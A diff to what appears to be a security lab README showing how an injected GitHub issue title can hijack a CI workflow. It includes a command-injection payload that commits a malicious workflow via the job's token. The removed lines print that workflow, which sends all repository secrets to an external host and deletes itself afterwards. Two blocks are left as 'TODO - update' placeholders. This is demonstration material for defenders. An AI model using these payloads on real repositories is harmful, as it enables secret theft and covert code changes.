@@ -72,44 +72,29 @@ First, we need to set up the server in the first demo.
 
 The issue title for the demo:
 
- ```bash
-# Send as issue body because issue title is capped at the character limit
-" && curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/CycodeLabs/gh-injection-vuln-demo/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"bmFtZTogRXhwb3NpbmcgQUxMIFNlY3JldHMKCm9uOgogIHdvcmtmbG93X3J1bjoKICAgIHdvcmtmbG93czogWyJWdWxuIl0KCmVudjoKICBXT1JLRkxPV19OQU1FOiAiaW5ub2NlbnRfd29ya2Zsb3cueW1sIgogIE1BSU5UQUlORVJfTkFNRTogIk1haW50YWluZXIgTmFtZSIKICBNQUlOVEFJTkVSX0VNQUlMOiAibWFpbnRhaW5lckBnbWFpbC5jb20iCiAgQ09NTUlUX01FU1NBR0U6ICJpbm5vY2VudCBjb21taXQgbWVzc2FnZSIKCmpvYnM6CiAgZXhwb3NlX3NlY3JldHM6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0CgogICAgc3RlcHM6CiAgICAgIC0gcnVuOiB8CiAgICAgICAgICBlY2hvICIke3sgdG9KU09OKHNlY3JldHMpIH19IiA+IC5zZWNyZXRzCiAgICAgICAgICBjdXJsIC1YIFBPU1QgLS1kYXRhICJALnNlY3JldHMiIGh0dHA6Ly9sYWIuY3ljb2RlLmNvbTo2NDM3NQogICAgICAtIHJ1bjogfAogICAgICAgICAgU0hBPSQoY3VybCAtWCBHRVQgLUggIkF1dGhvcml6YXRpb246IFRva2VuICR7eyBnaXRodWIudG9rZW4gfX0iIGh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvJFJFUE9TSVRPUlkvY29udGVudHMvLmdpdGh1Yi93b3JrZmxvd3MvJFdPUktGTE9XX05BTUUgLXMgfCBqcSAtciAuc2hhKQogICAgICAgICAgY3VybCAtWCBERUxFVEUgLUggIkF1dGhvcml6YXRpb246IFRva2VuICR7eyBnaXRodWIudG9rZW4gfX0iIGh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvJFJFUE9TSVRPUlkvY29udGVudHMvLmdpdGh1Yi93b3JrZmxvd3MvJFdPUktGTE9XX05BTUUgLWQgJ3sibWVzc2FnZSI6IiRDT01NSVRfTUVTU0FHRSIsImNvbW1pdHRlciI6eyJuYW1lIjoiJE1BSU5UQUlORVJfTkFNRSIsImVtYWlsIjoiJE1BSU5UQUlORVJfRU1BSUwifSwgInNoYSI6IiciJHtTSEF9IicifScg"}' && echo "
- ```
+```bash
+# Send as issue body because issue title is capped with character limit
+" && WORKFLOW_CONTENT=$(curl -s https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/actions/expose_secrets.yml | base64 -w 0) && curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"'"$WORKFLOW_CONTENT"'"}' && echo "
+```
+
+```bash
+# Fetching the workflow from our repository
+WORKFLOW_CONTENT=$(curl -s https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/actions/expose_secrets.yml | base64 -w 0)
+
+# Committing it to current repository
+curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"'"$WORKFLOW_CONTENT"'"}'
+```
 
 This payload consists of the following command:
 
 ```bash
-curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/CycodeLabs/gh-injection-vuln-demo/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"bmFt..."}'
+TODO - update
 ```
 
 The content is base64 encoding of the workflow we want to commit:
 
 ```yaml
-name: Exposing ALL Secrets
-
-on:
-  workflow_run:
-    workflows: ["Vuln"]
-
-env:
-  WORKFLOW_NAME: "innocent_workflow.yml"
-  MAINTAINER_EMAIL: "maintainer@gmail.com"
-  MAINTAINER_NAME: "Maintainer Name"
-  COMMIT_MESSAGE: "innocent commit message"
-  URL: http://lab.cycode.com:64375
-
-jobs:
- build:
-   runs-on: ubuntu-latest
-
-   steps:
-     - run: |
-         echo "${{ toJSON(secrets) }}" > .secrets
-         curl -X POST --data "@.secrets" $URL
-     - run: |
-         SHA=$(curl -X GET -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/$REPOSITORY/contents/.github/workflows/$WORKFLOW_NAME -s | jq -r .sha)
-         curl -X DELETE -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/$REPOSITORY/contents/.github/workflows/$WORKFLOW_NAME -d '{"message":"$COMMIT_MESSAGE","committer":{"name":"$MAINTAINER_NAME","email":"$MAINTAINER_EMAIL"}, "sha":"'"${SHA}"'"}' 
+TODO - update
 ```
 
 So the procedure of the demo is the following:
